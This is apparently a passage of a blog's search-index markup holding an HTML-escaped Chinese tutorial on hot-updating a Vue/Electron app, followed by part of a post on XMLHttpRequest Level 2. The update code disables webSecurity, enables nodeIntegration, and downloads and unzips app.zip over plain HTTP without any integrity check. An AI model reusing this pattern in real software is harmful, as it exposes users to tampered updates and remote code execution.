&lt;h2 id=&#34;二-新建vueconfigjs&#34;&gt;二、新建vue.config.js&lt;/h2&gt;
&lt;p&gt;1、重点是：&lt;strong&gt;&amp;quot;asar&amp;quot;: false,&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这句话的意思是，打包的时候&lt;code&gt;resources&lt;/code&gt;下就不产生&lt;code&gt;app.asar&lt;/code&gt;，而是一个app文件夹，而这个文件夹呢是可以直接进行替换的，里面的内容就是我们的前端整个项目的打包，就是渲染进程。所以，我们每次只需要替换前端的打包就可以了，而不需要每次都安装替换整个app&lt;/p&gt;
&lt;p&gt;2、将app图标放到public文件夹下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;module.exports = {
  pluginOptions: {
    electronBuilder: {
      builderOptions: {
        //productName: &amp;quot;ebopo&amp;quot;, // 项目名,这也是生成的exe文件的前缀名
        copyright: &#39;Copyright © Ambow&#39;,  // 应用程序版权行
        publish: [{
          &amp;quot;provider&amp;quot;: &amp;quot;generic&amp;quot;,
          &amp;quot;channel&amp;quot;: &amp;quot;latest&amp;quot;,
          &amp;quot;url&amp;quot;: &amp;quot;http://ambow-ebopo.oss-cn-beijing.aliyuncs.com/common/electron/&amp;quot;,
        }],
        &amp;quot;win&amp;quot;: {//win相关配置
          &amp;quot;icon&amp;quot;: &amp;quot;./public/app.ico&amp;quot;,//图标，当前图标在根目录下，注意这里有两个坑
          &amp;quot;target&amp;quot;: [
              {
                  &amp;quot;target&amp;quot;: &amp;quot;nsis&amp;quot;,//利用nsis制作安装程序
                  &amp;quot;arch&amp;quot;: [
                      &amp;quot;x64&amp;quot;,//64位
                      &amp;quot;ia32&amp;quot;//32位
                  ]
              }
          ]
        },
        &amp;quot;asar&amp;quot;: false,
        &amp;quot;nsis&amp;quot;: {
          &amp;quot;oneClick&amp;quot;: false, // 是否一键安装
          &amp;quot;allowElevation&amp;quot;: true, // 允许请求提升。 如果为false，则用户必须使用提升的权限重新启动安装程序。          
          &amp;quot;allowToChangeInstallationDirectory&amp;quot;: true, // 允许修改安装目录
          &amp;quot;installerIcon&amp;quot;: &amp;quot;./public/app.ico&amp;quot;,// 安装图标
          &amp;quot;uninstallerIcon&amp;quot;: &amp;quot;./public/app.ico&amp;quot;,//卸载图标
          &amp;quot;installerHeaderIcon&amp;quot;: &amp;quot;./public/app.ico&amp;quot;, // 安装时头部图标
          &amp;quot;createDesktopShortcut&amp;quot;: true, // 创建桌面图标
          &amp;quot;createStartMenuShortcut&amp;quot;: true,// 创建开始菜单图标
          &amp;quot;shortcutName&amp;quot;: &amp;quot;ebopo&amp;quot;, // 图标名称
        },
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;三-配置信息&#34;&gt;三、配置信息&lt;/h2&gt;
&lt;p&gt;background.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;
let win

function createWindow() {
  win = new BrowserWindow({
    width: 800,
    height: 600,     
    icon: `${__static}/app.ico`, // app内左上角图标
    webPreferences: {
      webSecurity: false, //取消跨域限制
      nodeIntegration:true, //开启node
    }
  })
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;package.json&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 打包exe前缀名称,及项目内左上角显示名称
&amp;quot;name&amp;quot;: &amp;quot;ebopo&amp;quot;,
// 版本号
&amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
&amp;quot;author&amp;quot;: &amp;quot;leecss&amp;quot;,
&amp;quot;description&amp;quot;: &amp;quot;electronApp&amp;quot;,
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;四-新增electron目录及设置菜单&#34;&gt;四、新增electron目录及设置菜单&lt;/h2&gt;
&lt;p&gt;在src文件夹下新建electron目录，在目录中新建menu.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import { BrowserWindow, Menu, app} from &#39;electron&#39;

let template = [{
  label: &#39;查看&#39;,
  submenu: [{
    label: &#39;重载&#39;,
    accelerator: &#39;CmdOrCtrl+R&#39;,
    click: (item, focusedWindow) =&amp;gt; {
      if (focusedWindow) {
        // 重载之后, 刷新并关闭所有之前打开的次要窗体
        if (focusedWindow.id === 1) {
          BrowserWindow.getAllWindows().forEach(win =&amp;gt; {
            if (win.id &amp;gt; 1) win.close()
          })
        }
        focusedWindow.reload()
      }
    }
  }, {
    label: &#39;切换全屏&#39;,
    accelerator: (() =&amp;gt; {
      if (process.platform === &#39;darwin&#39;) {
        return &#39;Ctrl+Command+F&#39;
      } else {
        return &#39;F11&#39;
      }
    })(),
    click: (item, focusedWindow) =&amp;gt; {
      if (focusedWindow) {
        focusedWindow.setFullScreen(!focusedWindow.isFullScreen())
      }
    }
  }]
}, {
  label: &#39;窗口&#39;,
  role: &#39;window&#39;,
  submenu: [{
    label: &#39;最小化&#39;,
    accelerator: &#39;CmdOrCtrl+M&#39;,
    role: &#39;minimize&#39;
  }, {
    label: &#39;关闭&#39;,
    accelerator: &#39;CmdOrCtrl+W&#39;,
    role: &#39;close&#39;
  }]
}, {
  label: &#39;帮助&#39;,
  role: &#39;help&#39;,
  submenu: [     
    {
      label: `版本` + app.getVersion(),
      enabled: false      
    },
    {
      label: &#39;切换开发者工具&#39;,
      accelerator: (() =&amp;gt; {
        if (process.platform === &#39;darwin&#39;) {
          return &#39;Alt+Command+I&#39;
        } else {
          return &#39;Ctrl+Shift+I&#39;
        }
      })(),
      click: (item, focusedWindow) =&amp;gt; {
        if (focusedWindow) {
          focusedWindow.toggleDevTools()
        }
      }
    }
  ]
}]

var list = Menu.buildFromTemplate(template)
Menu.setApplicationMenu(list)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改background.js ，在主进程中引入菜单&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;async function createWindow() {
+	require(&#39;./electron/menu.js&#39;)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;五-添加调试及日志文件输出&#34;&gt;五、添加调试及日志文件输出&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;npm i  electron-log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在electron目录下新建log.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import log from &#39;electron-log&#39;

log.transports.file.level = &#39;silly&#39;
log.transports.console.level = false // 禁用console输出

export default log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在background.js 中使用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import log from &#39;./electron/log&#39;

log.warn(&#39;hello&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;日志文件查看：文件main.log存储位置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\{用户}\AppData\Roaming\{appName}\logs
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;六-更新流程比较版本&#34;&gt;六、更新流程：比较版本&lt;/h2&gt;
&lt;p&gt;安装并引入axios&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;npm i axios
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;background.js&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import axios from &#39;axios&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;比较版本，若相同则返回，不相同则更新&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;async function createWindow() {
  require(&#39;./electron/menu.js&#39;)
  // Create the browser window.
  win = new BrowserWindow({
    width: 800,
    height: 600,
    icon: `${__static}/app.ico`, // app内左上角图标
    webPreferences: {      
      webSecurity: false, //取消跨域限制
      nodeIntegration:true, //开启node
    }
  })

  if (process.env.WEBPACK_DEV_SERVER_URL) {
    // Load the url of the dev server if in development mode
    await win.loadURL(process.env.WEBPACK_DEV_SERVER_URL)
    if (!process.env.IS_TEST) win.webContents.openDevTools()
  } else {
    createProtocol(&#39;app&#39;)
    // Load the index.html when not in development
    win.loadURL(&#39;app://./index.html&#39;)
    
    
    
    log.warn(&#39;hello&#39;)
    // 判断是否热更新，版本对比
    const updateUrl = &#39;http://ambow-ebopo.oss-cn-beijing.aliyuncs.com/common/electron&#39;
    const currentVersion = app.getVersion()
    log.warn(&#39;currentVersion&#39;,currentVersion)    
    axios({
      url: updateUrl + &#39;/latest.yml&#39;,
      method: &#39;GET&#39;
    }).then(res =&amp;gt; {      
      const remoteVersion = JSON.stringify(res.data).split(&#39;\\n&#39;)[0].split(&#39; &#39;)[1]
      log.warn(&#39;remoteVersion&#39;,remoteVersion)      
      if (currentVersion === remoteVersion) {
        log.warn(&#39;版本相同，无需更新&#39;)
        return;
      }
      // 热更新
      const updateZipUrl = updateUrl + &#39;/app.zip&#39;
      increment(updateZipUrl)      
    })
    
    
    
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;七-更新流程下载远程更新包appzip&#34;&gt;七、更新流程：下载远程更新包app.zip&lt;/h2&gt;
&lt;p&gt;在electron目录中新建downloadFile.js&lt;/p&gt;
&lt;p&gt;下载文件需要两个参数：下载路径，保存路径&lt;/p&gt;
&lt;p&gt;下载文件返回一个参数：保存路径&lt;/p&gt;
&lt;p&gt;安装fs-extra&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;npm i fs-extra
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const request = require(&#39;request&#39;)
const fs = require(&#39;fs&#39;)
const fse = require(&#39;fs-extra&#39;)
const path = require(&#39;path&#39;)
import log from &#39;./log&#39;

function download(url, targetPath, cb = () =&amp;gt; { }) {
  let status
  const req = request({
    method: &#39;GET&#39;,
    uri: encodeURI(url)
  })
  try {
    const stream = fs.createWriteStream(targetPath)
    let len = 0
    let cur = 0
    req.pipe(stream)
    req.on(&#39;response&#39;, (data) =&amp;gt; {
      len = parseInt(data.headers[&#39;content-length&#39;])
    })
    req.on(&#39;data&#39;, (chunk) =&amp;gt; {
      cur += chunk.length
      const progress = (100 * cur / len).toFixed(2)
      status = &#39;progressing&#39;
      cb(status, progress)
    })
    req.on(&#39;end&#39;, function () {
      if (req.response.statusCode === 200) {
        if (len === cur) {
          console.log(targetPath + &#39; Download complete &#39;)
          status = &#39;completed&#39;
          cb(status, 100)
        } else {
          stream.end()
          removeFile(targetPath)
          status = &#39;error&#39;
          cb(status, &#39;网络波动，下载文件不全&#39;)
        }
      } else {
        stream.end()
        removeFile(targetPath)
        status = &#39;error&#39;
        cb(status, req.response.statusMessage)
      }
    })
    req.on(&#39;error&#39;, (e) =&amp;gt; {
      stream.end()
      removeFile(targetPath)
      if (len !== cur) {
        status = &#39;error&#39;
        cb(status, &#39;网络波动，下载失败&#39;)
      } else {
        status = &#39;error&#39;
        cb(status, e)
      }
    })
  } catch (error) {
    console.log(error)
  }
}

function removeFile(targetPath) {
  try {
    fse.removeSync(targetPath)
  } catch (error) {
    console.log(error)
  }
}

export default async function downloadFile({ url, targetPath, folder = &#39;./&#39; }, cb = () =&amp;gt; { }) {  
  log.warn(&#39;download-url&#39;,url)
  log.warn(&#39;download-saveurl&#39;,targetPath)
  if (!targetPath || !url) {
    throw new Error(&#39;targetPath or url is nofind&#39;)
  }
  try {
    await fse.ensureDirSync(path.join(targetPath, folder))
  } catch (error) {
    throw new Error(error)
  }
  return new Promise((resolve, reject) =&amp;gt; {
    const name = url.split(&#39;/&#39;).pop()
    const filePath = path.join(targetPath, folder, name)
    download(url, filePath, (status, result) =&amp;gt; {
      if (status === &#39;completed&#39;) {
        resolve(filePath)
      }
      if (status === &#39;error&#39;) {
        reject(result)
      }
      if (status === &#39;progressing&#39;) {
        cb &amp;amp;&amp;amp; cb(result)
      }
    })
  })
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;八-更新流程将下载的appzip解压缩并删除&#34;&gt;八、更新流程：将下载的app.zip解压缩并删除&lt;/h2&gt;
&lt;p&gt;在electron目录中新建increment.js&lt;/p&gt;
&lt;p&gt;解压缩需要一个参数：加压压缩包的路径&lt;/p&gt;
&lt;p&gt;在文件下载完成后执行&lt;/p&gt;
&lt;p&gt;安装adm-zip&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;npm i adm-zip
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import downloadFile from &#39;./downloadFile&#39;
import { app } from &#39;electron&#39;
const fse = require(&#39;fs-extra&#39;)
const AdmZip = require(&#39;adm-zip&#39;)
import log from &#39;./log&#39;

export default async (updateZipUrl) =&amp;gt; {  
  const resourcesPath = process.resourcesPath
  downloadFile({ url: updateZipUrl, targetPath: resourcesPath }).then(async (filePath) =&amp;gt; {
    log.warn(&#39;unzip-filePath&#39;,filePath)
    const zip = new AdmZip(filePath)
    zip.extractAllToAsync(resourcesPath, true, (err) =&amp;gt; {
      if (err) {
        console.error(err)
        return
      }      
      fse.removeSync(filePath)      
      setTimeout(() =&amp;gt; {
        log.warn(&#39;relaunch&#39;)
        app.relaunch()
        app.exit(0)                
      }, 2000);
    })
  }).catch(err =&amp;gt; {
    console.log(err)
  })
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在background.js引入并调用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import increment from &#39;./electron/increment&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 热更新
const updateZipUrl = updateUrl + &#39;/app.zip&#39;
increment(updateZipUrl)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;九-更新流程将更新重启替换为重新加载&#34;&gt;九、更新流程：将更新重启替换为重新加载&lt;/h2&gt;
&lt;p&gt;在electron目录下新建global.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;global.sharedObject = {
  win: &#39;&#39;
}

export default global
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在background.js引入并调用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import global from &#39;./electron/global&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;async function createWindow() {
  require(&#39;./electron/menu.js&#39;)
  // Create the browser window.
  win = new BrowserWindow({
    width: 800,
    height: 600,
    icon: `${__static}/app.ico`, // app内左上角图标
    webPreferences: {      
      webSecurity: false, //取消跨域限制
      nodeIntegration:true, //开启node
    }
  })

  if (process.env.WEBPACK_DEV_SERVER_URL) {
    // Load the url of the dev server if in development mode
    await win.loadURL(process.env.WEBPACK_DEV_SERVER_URL)
    if (!process.env.IS_TEST) win.webContents.openDevTools()
  } else {
    createProtocol(&#39;app&#39;)
    // Load the index.html when not in development
    win.loadURL(&#39;app://./index.html&#39;)

    log.warn(&#39;hello&#39;)
    // 判断是否热更新，版本对比
    const updateUrl = &#39;http://ambow-ebopo.oss-cn-beijing.aliyuncs.com/common/electron&#39;
    const currentVersion = app.getVersion()
    log.warn(&#39;currentVersion&#39;,currentVersion)    
    axios({
      url: updateUrl + &#39;/latest.yml&#39;,
      method: &#39;GET&#39;
    }).then(res =&amp;gt; {      
      const remoteVersion = JSON.stringify(res.data).split(&#39;\\n&#39;)[0].split(&#39; &#39;)[1]
      log.warn(&#39;remoteVersion&#39;,remoteVersion)      
      if (currentVersion === remoteVersion) {
        log.warn(&#39;版本相同，无需更新&#39;)
        return;
      }
      // 热更新
      const updateZipUrl = updateUrl + &#39;/app.zip&#39;
      increment(updateZipUrl)      
    })

  }



  global.sharedObject.win = win
  win.on(&#39;closed&#39;, () =&amp;gt; {
    win = null
    global.sharedObject.win = null
  })


  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在increment.js中引入并调用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import downloadFile from &#39;./downloadFile&#39;
import global from &#39;./global&#39;
const fse = require(&#39;fs-extra&#39;)
const AdmZip = require(&#39;adm-zip&#39;)
import log from &#39;./log&#39;

export default async (updateZipUrl) =&amp;gt; {  
  const resourcesPath = process.resourcesPath
  downloadFile({ url: updateZipUrl, targetPath: resourcesPath }).then(async (filePath) =&amp;gt; {
    log.warn(&#39;unzip-filePath&#39;,filePath)
    const zip = new AdmZip(filePath)
    zip.extractAllToAsync(resourcesPath, true, (err) =&amp;gt; {
      if (err) {
        console.error(err)
        return
      }      
      fse.removeSync(filePath)      
      setTimeout(() =&amp;gt; {        
        log.warn(&#39;relaunch&#39;)
        global.sharedObject.win.webContents.reloadIgnoringCache()          
      }, 2000);
    })
  }).catch(err =&amp;gt; {
    console.log(err)
  })
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;setTimeout是为了演示效果，最后去掉。&lt;/p&gt;
&lt;h2 id=&#34;十-遇到的问题&#34;&gt;十、遇到的问题&lt;/h2&gt;
&lt;p&gt;更新时报错，如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Error: EPERM: operation not permitted
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;原因是没有管理员权限，且安装时选择的为所有用户安装。&lt;/p&gt;
&lt;p&gt;方案一：运行时选择：以管理员身份运行&lt;/p&gt;
&lt;p&gt;方案二：下载时，仅为当前用户安装&lt;/p&gt;
&lt;p&gt;解决方案：&lt;/p&gt;
&lt;p&gt;在设置上，不给用户选择为所有用户安装的机会，默认一键安装，设置如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;&amp;quot;nsis&amp;quot;: {
    &amp;quot;oneClick&amp;quot;: true, // 是否一键安装          
    &amp;quot;installerIcon&amp;quot;: &amp;quot;./public/app.ico&amp;quot;,// 安装图标
    &amp;quot;uninstallerIcon&amp;quot;: &amp;quot;./public/app.ico&amp;quot;,//卸载图标
    &amp;quot;installerHeaderIcon&amp;quot;: &amp;quot;./public/app.ico&amp;quot;, // 安装时头部图标
    &amp;quot;createDesktopShortcut&amp;quot;: true, // 创建桌面图标
    &amp;quot;createStartMenuShortcut&amp;quot;: true,// 创建开始菜单图标
    &amp;quot;shortcutName&amp;quot;: &amp;quot;ebopo&amp;quot;, // 图标名称
},
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;十一-在ts项目中使用&#34;&gt;十一、在ts项目中使用&lt;/h2&gt;
&lt;p&gt;electron-log的使用要用ts文件，并且用any声明，其他相似问题同理。&lt;/p&gt;
&lt;p&gt;log.ts&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-typescript&#34;&gt;const log:any = require(&#39;electron-log&#39;);

log.transports.file.level = &#39;silly&#39;
log.transports.console.level = false // 禁用console输出

export default log
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;github地址&#34;&gt;GitHub地址&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/lee-css/vue-cli-electron-update-part&#34;&gt;vue-cli-electron-update-part&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://xuxin123.com/electron/increment-update1/&#34;&gt;https://xuxin123.com/electron/increment-update1/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;文档&#34;&gt;文档&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://nklayman.github.io/vue-cli-plugin-electron-builder/&#34;&gt;https://nklayman.github.io/vue-cli-plugin-electron-builder/&lt;/a&gt;&lt;/p&gt;
">63-electron-1-增量更新</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-xmlhttprequest-level2/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/XMLHttpRequest&#34;&gt;XMLHttpRequest&lt;/a&gt;是一个浏览器接口，使得Javascript可以进行HTTP(S)通信。&lt;/p&gt;
&lt;p&gt;最早，微软在IE 5引进了这个接口。因为它太有用，其他浏览器也模仿部署了，ajax操作因此得以诞生。&lt;/p&gt;
&lt;p&gt;但是，这个接口一直没有标准化，每家浏览器的实现或多或少有点不同。HTML 5的概念形成后，W3C开始考虑标准化这个接口。2008年2月，就提出了&lt;a href=&#34;https://dev.w3.org/2006/webapi/XMLHttpRequest-2/&#34;&gt;XMLHttpRequest Level 2&lt;/a&gt; 草案。&lt;/p&gt;
&lt;h2 id=&#34;一-老版本的xmlhttprequest对象&#34;&gt;&lt;strong&gt;一、老版本的XMLHttpRequest对象&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;在介绍新版本之前，我们先回顾一下老版本的用法。&lt;/p&gt;
&lt;p&gt;首先，新建一个XMLHttpRequest的实例。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;var xhr = new XMLHttpRequest();&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后，向远程主机发出一个HTTP请求。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xhr.open(&#39;GET&#39;, &#39;example.php&#39;);&lt;/p&gt;
&lt;p&gt;xhr.send();&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接着，就等待远程主机做出回应。这时需要监控XMLHttpRequest对象的状态变化，指定回调函数。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xhr.onreadystatechange = function(){&lt;/p&gt;
&lt;p&gt;if ( xhr.readyState == 4 &amp;amp;&amp;amp; xhr.status == 200 ) {&lt;/p&gt;
&lt;p&gt;alert( xhr.responseText );&lt;/p&gt;
&lt;p&gt;} else {&lt;/p&gt;
&lt;p&gt;alert( xhr.statusText );&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;p&gt;};&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面的代码包含了老版本XMLHttpRequest对象的主要属性：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;* xhr.readyState：XMLHttpRequest对象的状态，等于4表示数据已经接收完毕。&lt;/p&gt;
&lt;p&gt;* xhr.status：服务器返回的状态码，等于200表示一切正常。&lt;/p&gt;
&lt;p&gt;* xhr.responseText：服务器返回的文本数据&lt;/p&gt;
&lt;p&gt;* xhr.responseXML：服务器返回的XML格式的数据&lt;/p&gt;
&lt;p&gt;* xhr.statusText：服务器返回的状态文本。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;二-老版本的缺点&#34;&gt;&lt;strong&gt;二、老版本的缺点&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;老版本的XMLHttpRequest对象有以下几个缺点：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;* 只支持文本数据的传送，无法用来读取和上传二进制文件。&lt;/p&gt;
&lt;p&gt;* 传送和接收数据时，没有进度信息，只能提示有没有完成。&lt;/p&gt;
&lt;p&gt;* 受到&lt;a href=&#34;https://www.w3.org/Security/wiki/Same_Origin_Policy&#34;&gt;&amp;quot;同域限制&amp;quot;&lt;/a&gt;（Same Origin Policy），只能向同一域名的服务器请求数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;三-新版本的功能&#34;&gt;&lt;strong&gt;三、新版本的功能&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;新版本的XMLHttpRequest对象，针对老版本的缺点，做出了大幅改进。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;* 可以设置HTTP请求的时限。&lt;/p&gt;
&lt;p&gt;* 可以使用FormData对象管理表单数据。&lt;/p&gt;
&lt;p&gt;* 可以上传文件。&lt;/p&gt;
&lt;p&gt;* 可以请求不同域名下的数据（跨域请求）。&lt;/p&gt;
&lt;p&gt;* 可以获取服务器端的二进制数据。&lt;/p&gt;
&lt;p&gt;* 可以获得数据传输的进度信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下面，我就一一介绍这些新功能。&lt;/p&gt;
&lt;h2 id=&#34;四-http请求的时限&#34;&gt;&lt;strong&gt;四、HTTP请求的时限&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;有时，ajax操作很耗时，而且无法预知要花多少时间。如果网速很慢，用户可能要等很久。&lt;/p&gt;
&lt;p&gt;新版本的XMLHttpRequest对象，增加了timeout属性，可以设置HTTP请求的时限。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xhr.timeout = 3000;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面的语句，将最长等待时间设为3000毫秒。过了这个时限，就自动停止HTTP请求。与之配套的还有一个timeout事件，用来指定回调函数。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xhr.ontimeout = function(event){&lt;/p&gt;
&lt;p&gt;alert(&#39;请求超时！&#39;);&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;目前，Opera、Firefox和IE 10支持该属性，IE 8和IE 9的这个属性属于XDomainRequest对象，而Chrome和Safari还不支持。&lt;/p&gt;
&lt;h2 id=&#34;五-formdata对象&#34;&gt;&lt;strong&gt;五、FormData对象&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;ajax操作往往用来传递表单数据。为了方便表单处理，HTML 5新增了一个FormData对象，可以模拟表单。&lt;/p&gt;
&lt;p&gt;首先，新建一个FormData对象。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;var formData = new FormData();&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后，为它添加表单项。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;formData.append(&#39;username&#39;, &#39;张三&#39;);&lt;/p&gt;
&lt;p&gt;formData.append(&#39;id&#39;, 123456);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最后，直接传送这个FormData对象。这与提交网页表单的效果，完全一样。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xhr.send(formData);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;FormData对象也可以用来获取网页表单的值。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;var form = document.getElementById(&#39;myform&#39;);&lt;/p&gt;
&lt;p&gt;var formData = new FormData(form);&lt;/p&gt;
&lt;p&gt;formData.append(&#39;secret&#39;, &#39;123456&#39;); // 添加一个表单项&lt;/p&gt;
&lt;p&gt;xhr.open(&#39;POST&#39;, form.action);&lt;/p&gt;
&lt;p&gt;xhr.send(formData);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;六-上传文件&#34;&gt;&lt;strong&gt;六、上传文件&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;新版XMLHttpRequest对象，不仅可以发送文本信息，还可以上传文件。&lt;/p&gt;
&lt;p&gt;假定files是一个&amp;quot;选择文件&amp;quot;的表单元素（input[type=&amp;quot;file&amp;quot;]），我们将它装入FormData对象。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;var formData = new FormData();&lt;/p&gt;
&lt;p&gt;for (var i = 0; i &amp;lt; files.length;i++) {&lt;/p&gt;
&lt;p&gt;formData.append(&#39;files[]&#39;, files[i]);&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后，发送这个FormData对象。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xhr.send(formData);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;七-跨域资源共享cors&#34;&gt;&lt;strong&gt;七、跨域资源共享（CORS）&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;新版本的XMLHttpRequest对象，可以向不同域名的服务器发出HTTP请求。这叫做&lt;a href=&#34;https://en.wikipedia.org/wiki/Cross-Origin_Resource_Sharing&#34;&gt;&amp;quot;跨域资源共享&amp;quot;&lt;/a&gt;（Cross-origin resource sharing，简称CORS）。&lt;/p&gt;
&lt;p&gt;使用&amp;quot;跨域资源共享&amp;quot;的前提，是浏览器必须支持这个功能，而且服务器端必须同意这种&amp;quot;跨域&amp;quot;。如果能够满足上面的条件，则代码的写法与不跨域的请求完全一样。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xhr.open(&#39;GET&#39;, &#39;http://other.server/and/path/to/script&#39;);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;目前，除了IE 8和IE 9，主流浏览器都支持CORS，IE 10也将支持这个功能。服务器端的设置，请参考&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Server-Side_Access_Control&#34;&gt;《Server-Side Access Control》&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&#34;八-接收二进制数据方法a改写mimetype&#34;&gt;&lt;strong&gt;八、接收二进制数据（方法A：改写MIMEType）&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;老版本的XMLHttpRequest对象，只能从服务器取回文本数据（否则它的名字就不用XML起首了），新版则可以取回二进制数据。&lt;/p&gt;
&lt;p&gt;这里又分成两种做法。较老的做法是改写数据的MIMEType，将服务器返回的二进制数据伪装成文本数据，并且告诉浏览器这是用户自定义的字符集。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xhr.overrideMimeType(&amp;quot;text/plain; charset=x-user-defined&amp;quot;);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后，用responseText属性接收服务器返回的二进制数据。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;var binStr = xhr.responseText;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由于这时，浏览器把它当做文本数据，所以还必须再一个个字节地还原成二进制数据。&lt;/p&gt;
&lt;blockquote&gt;
